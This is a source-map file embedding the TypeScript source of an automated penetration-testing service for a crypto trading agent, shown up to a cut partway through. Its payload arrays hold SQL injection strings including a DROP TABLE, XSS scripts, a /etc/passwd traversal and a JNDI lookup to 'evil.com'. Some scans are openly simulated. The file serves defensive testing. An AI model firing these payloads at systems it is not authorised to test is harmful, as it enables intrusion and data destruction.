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",
      names: [],
      sources: ["C:\\Users\\Nick\\Desktop\\SmoothSail\\src\\security\\penetration-testing-service.ts"],
      sourcesContent: ["/**\r\n * Penetration Testing Service\r\n * \r\n * Implements automated penetration testing for API endpoints, vulnerability scanning,\r\n * and security compliance testing for the AI crypto trading agent.\r\n * \r\n * Features:\r\n * - API endpoint security testing\r\n * - Vulnerability scanning and assessment\r\n * - Security compliance validation\r\n * - Automated security test execution\r\n */\r\n\r\nimport { Logger } from '../core/logging/logger';\r\nimport { EncryptionService } from './encryption-service';\r\nimport { ThreatDetectionEngine } from './threat-detection-engine';\r\nimport axios, { AxiosResponse } from 'axios';\r\nimport * as crypto from 'crypto';\r\n\r\nexport interface SecurityTestResult {\r\n  testId: string;\r\n  testName: string;\r\n  category: 'API_SECURITY' | 'VULNERABILITY_SCAN' | 'COMPLIANCE' | 'PENETRATION';\r\n  status: 'PASS' | 'FAIL' | 'WARNING';\r\n  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';\r\n  description: string;\r\n  findings: SecurityFinding[];\r\n  recommendations: string[];\r\n  timestamp: Date;\r\n  executionTime: number;\r\n}\r\n\r\nexport interface SecurityFinding {\r\n  id: string;\r\n  type: string;\r\n  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';\r\n  description: string;\r\n  location: string;\r\n  evidence: string;\r\n  cveId?: string;\r\n  remediation: string;\r\n}\r\n\r\nexport interface PenetrationTestConfig {\r\n  targetEndpoints: string[];\r\n  testTypes: string[];\r\n  maxConcurrentTests: number;\r\n  timeoutMs: number;\r\n  enableDestructiveTesting: boolean;\r\n  complianceStandards: string[];\r\n}\r\n\r\nexport interface VulnerabilityReport {\r\n  scanId: string;\r\n  timestamp: Date;\r\n  totalVulnerabilities: number;\r\n  criticalCount: number;\r\n  highCount: number;\r\n  mediumCount: number;\r\n  lowCount: number;\r\n  vulnerabilities: SecurityFinding[];\r\n  complianceScore: number;\r\n  recommendations: string[];\r\n}\r\n\r\nexport class PenetrationTestingService {\r\n  private logger: Logger;\r\n  private encryptionService: EncryptionService;\r\n  private threatDetection: ThreatDetectionEngine;\r\n  private testResults: SecurityTestResult[] = [];\r\n  private config: PenetrationTestConfig;\r\n\r\n  constructor(\r\n    logger: Logger,\r\n    encryptionService: EncryptionService,\r\n    threatDetection: ThreatDetectionEngine,\r\n    config: PenetrationTestConfig\r\n  ) {\r\n    this.logger = logger;\r\n    this.encryptionService = encryptionService;\r\n    this.threatDetection = threatDetection;\r\n    this.config = config;\r\n  }\r\n\r\n  /**\r\n   * Execute comprehensive security testing suite\r\n   */\r\n  async executeSecurityTestSuite(): Promise<VulnerabilityReport> {\r\n    const startTime = Date.now();\r\n    this.logger.info('Starting comprehensive security test suite execution');\r\n\r\n    try {\r\n      // Run all security tests in parallel\r\n      const testPromises = [\r\n        this.runAPISecurityTests(),\r\n        this.runVulnerabilityScanning(),\r\n        this.runComplianceTests(),\r\n        this.runPenetrationTests()\r\n      ];\r\n\r\n      const testResults = await Promise.all(testPromises);\r\n      const allResults = testResults.flat();\r\n      \r\n      // Generate comprehensive vulnerability report\r\n      const report = this.generateVulnerabilityReport(allResults);\r\n      \r\n      const executionTime = Date.now() - startTime;\r\n      this.logger.info(`Security test suite completed in ${executionTime}ms`, {\r\n        totalTests: allResults.length,\r\n        criticalFindings: report.criticalCount,\r\n        complianceScore: report.complianceScore\r\n      });\r\n\r\n      // Store results for audit trail\r\n      this.testResults.push(...allResults);\r\n\r\n      return report;\r\n    } catch (error) {\r\n      this.logger.error('Security test suite execution failed', { error });\r\n      throw error;\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Run API security tests\r\n   */\r\n  private async runAPISecurityTests(): Promise<SecurityTestResult[]> {\r\n    const results: SecurityTestResult[] = [];\r\n    \r\n    for (const endpoint of this.config.targetEndpoints) {\r\n      // SQL Injection Testing\r\n      results.push(await this.testSQLInjection(endpoint));\r\n      \r\n      // XSS Testing\r\n      results.push(await this.testXSSVulnerabilities(endpoint));\r\n      \r\n      // Authentication Bypass Testing\r\n      results.push(await this.testAuthenticationBypass(endpoint));\r\n      \r\n      // Rate Limiting Testing\r\n      results.push(await this.testRateLimiting(endpoint));\r\n      \r\n      // Input Validation Testing\r\n      results.push(await this.testInputValidation(endpoint));\r\n      \r\n      // HTTPS/TLS Testing\r\n      results.push(await this.testTLSSecurity(endpoint));\r\n    }\r\n\r\n    return results;\r\n  }\r\n\r\n  /**\r\n   * Test for SQL injection vulnerabilities\r\n   */\r\n  private async testSQLInjection(endpoint: string): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    const sqlPayloads = [\r\n      \"' OR '1'='1\",\r\n      \"'; DROP TABLE users; --\",\r\n      \"' UNION SELECT * FROM users --\",\r\n      \"1' AND (SELECT COUNT(*) FROM users) > 0 --\"\r\n    ];\r\n\r\n    try {\r\n      for (const payload of sqlPayloads) {\r\n        const response = await this.sendTestRequest(endpoint, { input: payload });\r\n        \r\n        if (this.detectSQLInjectionVulnerability(response)) {\r\n          findings.push({\r\n            id: crypto.randomUUID(),\r\n            type: 'SQL_INJECTION',\r\n            severity: 'CRITICAL',\r\n            description: `SQL injection vulnerability detected with payload: ${payload}`,\r\n            location: endpoint,\r\n            evidence: response.data?.toString().substring(0, 500) || '',\r\n            remediation: 'Implement parameterized queries and input sanitization'\r\n          });\r\n        }\r\n      }\r\n\r\n      return {\r\n        testId,\r\n        testName: 'SQL Injection Test',\r\n        category: 'API_SECURITY',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'CRITICAL' : 'LOW',\r\n        description: 'Tests for SQL injection vulnerabilities in API endpoints',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Use parameterized queries',\r\n          'Implement input validation',\r\n          'Apply principle of least privilege to database connections'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('SQL injection test failed', { endpoint, error });\r\n      return this.createErrorTestResult(testId, 'SQL Injection Test', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Test for XSS vulnerabilities\r\n   */\r\n  private async testXSSVulnerabilities(endpoint: string): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    const xssPayloads = [\r\n      \"<script>alert('XSS')</script>\",\r\n      \"javascript:alert('XSS')\",\r\n      \"<img src=x onerror=alert('XSS')>\",\r\n      \"';alert('XSS');//\"\r\n    ];\r\n\r\n    try {\r\n      for (const payload of xssPayloads) {\r\n        const response = await this.sendTestRequest(endpoint, { input: payload });\r\n        \r\n        if (this.detectXSSVulnerability(response, payload)) {\r\n          findings.push({\r\n            id: crypto.randomUUID(),\r\n            type: 'XSS',\r\n            severity: 'HIGH',\r\n            description: `XSS vulnerability detected with payload: ${payload}`,\r\n            location: endpoint,\r\n            evidence: response.data?.toString().substring(0, 500) || '',\r\n            remediation: 'Implement output encoding and Content Security Policy'\r\n          });\r\n        }\r\n      }\r\n\r\n      return {\r\n        testId,\r\n        testName: 'XSS Vulnerability Test',\r\n        category: 'API_SECURITY',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'HIGH' : 'LOW',\r\n        description: 'Tests for Cross-Site Scripting vulnerabilities',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Implement output encoding',\r\n          'Use Content Security Policy headers',\r\n          'Validate and sanitize all user inputs'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('XSS test failed', { endpoint, error });\r\n      return this.createErrorTestResult(testId, 'XSS Vulnerability Test', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Test authentication bypass vulnerabilities\r\n   */\r\n  private async testAuthenticationBypass(endpoint: string): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      // Test without authentication\r\n      const noAuthResponse = await this.sendTestRequest(endpoint, {}, {});\r\n      \r\n      if (noAuthResponse.status === 200) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'AUTH_BYPASS',\r\n          severity: 'CRITICAL',\r\n          description: 'Endpoint accessible without authentication',\r\n          location: endpoint,\r\n          evidence: `HTTP ${noAuthResponse.status} response received`,\r\n          remediation: 'Implement proper authentication checks'\r\n        });\r\n      }\r\n\r\n      // Test with invalid tokens\r\n      const invalidTokenResponse = await this.sendTestRequest(\r\n        endpoint, \r\n        {}, \r\n        { Authorization: 'Bearer invalid_token_12345' }\r\n      );\r\n      \r\n      if (invalidTokenResponse.status === 200) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'AUTH_BYPASS',\r\n          severity: 'CRITICAL',\r\n          description: 'Endpoint accepts invalid authentication tokens',\r\n          location: endpoint,\r\n          evidence: `HTTP ${invalidTokenResponse.status} with invalid token`,\r\n          remediation: 'Implement proper token validation'\r\n        });\r\n      }\r\n\r\n      return {\r\n        testId,\r\n        testName: 'Authentication Bypass Test',\r\n        category: 'API_SECURITY',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'CRITICAL' : 'LOW',\r\n        description: 'Tests for authentication bypass vulnerabilities',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Implement robust authentication mechanisms',\r\n          'Validate all authentication tokens',\r\n          'Use secure session management'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('Authentication bypass test failed', { endpoint, error });\r\n      return this.createErrorTestResult(testId, 'Authentication Bypass Test', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Test rate limiting implementation\r\n   */\r\n  private async testRateLimiting(endpoint: string): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      // Send rapid requests to test rate limiting\r\n      const requests = Array(100).fill(null).map(() => \r\n        this.sendTestRequest(endpoint, {}).catch(err => ({ status: err.response?.status || 0 }))\r\n      );\r\n\r\n      const responses = await Promise.all(requests);\r\n      const rateLimitedResponses = responses.filter(r => r.status === 429);\r\n\r\n      if (rateLimitedResponses.length === 0) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'RATE_LIMITING',\r\n          severity: 'MEDIUM',\r\n          description: 'No rate limiting detected on endpoint',\r\n          location: endpoint,\r\n          evidence: `${responses.length} requests sent, 0 rate limited`,\r\n          remediation: 'Implement rate limiting to prevent abuse'\r\n        });\r\n      }\r\n\r\n      return {\r\n        testId,\r\n        testName: 'Rate Limiting Test',\r\n        category: 'API_SECURITY',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'MEDIUM' : 'LOW',\r\n        description: 'Tests for proper rate limiting implementation',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Implement rate limiting middleware',\r\n          'Use sliding window or token bucket algorithms',\r\n          'Return appropriate HTTP 429 responses'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('Rate limiting test failed', { endpoint, error });\r\n      return this.createErrorTestResult(testId, 'Rate Limiting Test', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Test input validation\r\n   */\r\n  private async testInputValidation(endpoint: string): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    const maliciousInputs = [\r\n      '../../../etc/passwd',\r\n      '${jndi:ldap://evil.com/a}',\r\n      '{{7*7}}',\r\n      '<script>alert(1)</script>',\r\n      'A'.repeat(10000) // Buffer overflow test\r\n    ];\r\n\r\n    try {\r\n      for (const input of maliciousInputs) {\r\n        const response = await this.sendTestRequest(endpoint, { data: input });\r\n        \r\n        if (response.status === 500 || this.detectInputValidationIssue(response)) {\r\n          findings.push({\r\n            id: crypto.randomUUID(),\r\n            type: 'INPUT_VALIDATION',\r\n            severity: 'HIGH',\r\n            description: `Input validation issue detected with input: ${input.substring(0, 50)}`,\r\n            location: endpoint,\r\n            evidence: response.data?.toString().substring(0, 500) || '',\r\n            remediation: 'Implement comprehensive input validation and sanitization'\r\n          });\r\n        }\r\n      }\r\n\r\n      return {\r\n        testId,\r\n        testName: 'Input Validation Test',\r\n        category: 'API_SECURITY',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'HIGH' : 'LOW',\r\n        description: 'Tests for proper input validation',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Implement strict input validation',\r\n          'Use allowlist validation approach',\r\n          'Sanitize all user inputs'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('Input validation test failed', { endpoint, error });\r\n      return this.createErrorTestResult(testId, 'Input Validation Test', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Test TLS/HTTPS security\r\n   */\r\n  private async testTLSSecurity(endpoint: string): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      // Test if HTTP version is accessible\r\n      const httpEndpoint = endpoint.replace('https://', 'http://');\r\n      \r\n      try {\r\n        const httpResponse = await axios.get(httpEndpoint, { timeout: 5000 });\r\n        if (httpResponse.status === 200) {\r\n          findings.push({\r\n            id: crypto.randomUUID(),\r\n            type: 'TLS_SECURITY',\r\n            severity: 'HIGH',\r\n            description: 'Endpoint accessible over unencrypted HTTP',\r\n            location: httpEndpoint,\r\n            evidence: `HTTP ${httpResponse.status} response received`,\r\n            remediation: 'Enforce HTTPS-only access with HSTS headers'\r\n          });\r\n        }\r\n      } catch (error) {\r\n        // HTTP not accessible is good\r\n      }\r\n\r\n      // Test HTTPS configuration\r\n      const httpsResponse = await axios.get(endpoint, { timeout: 5000 });\r\n      \r\n      // Check for security headers\r\n      const securityHeaders = [\r\n        'strict-transport-security',\r\n        'x-content-type-options',\r\n        'x-frame-options',\r\n        'x-xss-protection'\r\n      ];\r\n\r\n      for (const header of securityHeaders) {\r\n        if (!httpsResponse.headers[header]) {\r\n          findings.push({\r\n            id: crypto.randomUUID(),\r\n            type: 'SECURITY_HEADERS',\r\n            severity: 'MEDIUM',\r\n            description: `Missing security header: ${header}`,\r\n            location: endpoint,\r\n            evidence: `Header ${header} not present in response`,\r\n            remediation: `Add ${header} security header`\r\n          });\r\n        }\r\n      }\r\n\r\n      return {\r\n        testId,\r\n        testName: 'TLS Security Test',\r\n        category: 'API_SECURITY',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'HIGH' : 'LOW',\r\n        description: 'Tests for proper TLS/HTTPS security configuration',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Enforce HTTPS-only access',\r\n          'Implement HSTS headers',\r\n          'Add comprehensive security headers'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('TLS security test failed', { endpoint, error });\r\n      return this.createErrorTestResult(testId, 'TLS Security Test', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Run vulnerability scanning\r\n   */\r\n  private async runVulnerabilityScanning(): Promise<SecurityTestResult[]> {\r\n    const results: SecurityTestResult[] = [];\r\n    \r\n    // Dependency vulnerability scanning\r\n    results.push(await this.scanDependencyVulnerabilities());\r\n    \r\n    // Configuration security scanning\r\n    results.push(await this.scanConfigurationSecurity());\r\n    \r\n    // File system security scanning\r\n    results.push(await this.scanFileSystemSecurity());\r\n\r\n    return results;\r\n  }\r\n\r\n  /**\r\n   * Scan for dependency vulnerabilities\r\n   */\r\n  private async scanDependencyVulnerabilities(): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      // This would integrate with npm audit or similar tools\r\n      // For now, we'll simulate the scanning process\r\n      \r\n      const packageJson = require('../../package.json');\r\n      const dependencies = { ...packageJson.dependencies, ...packageJson.devDependencies };\r\n\r\n      // Simulate vulnerability detection\r\n      for (const [pkg, version] of Object.entries(dependencies)) {\r\n        if (this.isVulnerablePackage(pkg as string, version as string)) {\r\n          findings.push({\r\n            id: crypto.randomUUID(),\r\n            type: 'DEPENDENCY_VULNERABILITY',\r\n            severity: 'HIGH',\r\n            description: `Vulnerable dependency detected: ${pkg}@${version}`,\r\n            location: 'package.json',\r\n            evidence: `Package ${pkg} version ${version} has known vulnerabilities`,\r\n            remediation: `Update ${pkg} to latest secure version`\r\n          });\r\n        }\r\n      }\r\n\r\n      return {\r\n        testId,\r\n        testName: 'Dependency Vulnerability Scan',\r\n        category: 'VULNERABILITY_SCAN',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'HIGH' : 'LOW',\r\n        description: 'Scans for vulnerabilities in project dependencies',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Update vulnerable dependencies',\r\n          'Use npm audit to check for vulnerabilities',\r\n          'Implement automated dependency scanning in CI/CD'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('Dependency vulnerability scan failed', { error });\r\n      return this.createErrorTestResult(testId, 'Dependency Vulnerability Scan', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Scan configuration security\r\n   */\r\n  private async scanConfigurationSecurity(): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      // Check for hardcoded secrets\r\n      const configFiles = ['.env', '.env.example', 'src/config/'];\r\n      \r\n      for (const file of configFiles) {\r\n        const secrets = await this.scanForHardcodedSecrets(file);\r\n        findings.push(...secrets);\r\n      }\r\n\r\n      // Check for insecure configurations\r\n      const insecureConfigs = await this.scanForInsecureConfigurations();\r\n      findings.push(...insecureConfigs);\r\n\r\n      return {\r\n        testId,\r\n        testName: 'Configuration Security Scan',\r\n        category: 'VULNERABILITY_SCAN',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'HIGH' : 'LOW',\r\n        description: 'Scans for security issues in configuration files',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Remove hardcoded secrets',\r\n          'Use environment variables for sensitive data',\r\n          'Implement secure configuration management'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('Configuration security scan failed', { error });\r\n      return this.createErrorTestResult(testId, 'Configuration Security Scan', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Scan file system security\r\n   */\r\n  private async scanFileSystemSecurity(): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      // Check file permissions\r\n      const permissionIssues = await this.scanFilePermissions();\r\n      findings.push(...permissionIssues);\r\n\r\n      // Check for sensitive files\r\n      const sensitiveFiles = await this.scanForSensitiveFiles();\r\n      findings.push(...sensitiveFiles);\r\n\r\n      return {\r\n        testId,\r\n        testName: 'File System Security Scan',\r\n        category: 'VULNERABILITY_SCAN',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'MEDIUM' : 'LOW',\r\n        description: 'Scans for file system security issues',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Fix file permission issues',\r\n          'Remove or secure sensitive files',\r\n          'Implement proper access controls'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('File system security scan failed', { error });\r\n      return this.createErrorTestResult(testId, 'File System Security Scan', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Run compliance tests\r\n   */\r\n  private async runComplianceTests(): Promise<SecurityTestResult[]> {\r\n    const results: SecurityTestResult[] = [];\r\n    \r\n    for (const standard of this.config.complianceStandards) {\r\n      results.push(await this.runComplianceTest(standard));\r\n    }\r\n\r\n    return results;\r\n  }\r\n\r\n  /**\r\n   * Run specific compliance test\r\n   */\r\n  private async runComplianceTest(standard: string): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      switch (standard) {\r\n        case 'OWASP_TOP_10':\r\n          findings.push(...await this.checkOWASPCompliance());\r\n          break;\r\n        case 'ISO_27001':\r\n          findings.push(...await this.checkISO27001Compliance());\r\n          break;\r\n        case 'SOC_2':\r\n          findings.push(...await this.checkSOC2Compliance());\r\n          break;\r\n        default:\r\n          this.logger.warn(`Unknown compliance standard: ${standard}`);\r\n      }\r\n\r\n      return {\r\n        testId,\r\n        testName: `${standard} Compliance Test`,\r\n        category: 'COMPLIANCE',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'HIGH' : 'LOW',\r\n        description: `Tests compliance with ${standard} standard`,\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          `Address ${standard} compliance gaps`,\r\n          'Implement required security controls',\r\n          'Document compliance procedures'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error(`${standard} compliance test failed`, { error });\r\n      return this.createErrorTestResult(testId, `${standard} Compliance Test`, error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Run penetration tests\r\n   */\r\n  private async runPenetrationTests(): Promise<SecurityTestResult[]> {\r\n    const results: SecurityTestResult[] = [];\r\n    \r\n    // Network penetration testing\r\n    results.push(await this.runNetworkPenetrationTest());\r\n    \r\n    // Application penetration testing\r\n    results.push(await this.runApplicationPenetrationTest());\r\n    \r\n    // Social engineering simulation\r\n    results.push(await this.runSocialEngineeringTest());\r\n\r\n    return results;\r\n  }\r\n\r\n  /**\r\n   * Run network penetration test\r\n   */\r\n  private async runNetworkPenetrationTest(): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      // Port scanning simulation\r\n      const openPorts = await this.scanOpenPorts();\r\n      \r\n      for (const port of openPorts) {\r\n        if (this.isUnnecessaryPort(port)) {\r\n          findings.push({\r\n            id: crypto.randomUUID(),\r\n            type: 'NETWORK_SECURITY',\r\n            severity: 'MEDIUM',\r\n            description: `Unnecessary port ${port} is open`,\r\n            location: `Network port ${port}`,\r\n            evidence: `Port ${port} responds to connections`,\r\n            remediation: `Close unnecessary port ${port} or implement proper access controls`\r\n          });\r\n        }\r\n      }\r\n\r\n      return {\r\n        testId,\r\n        testName: 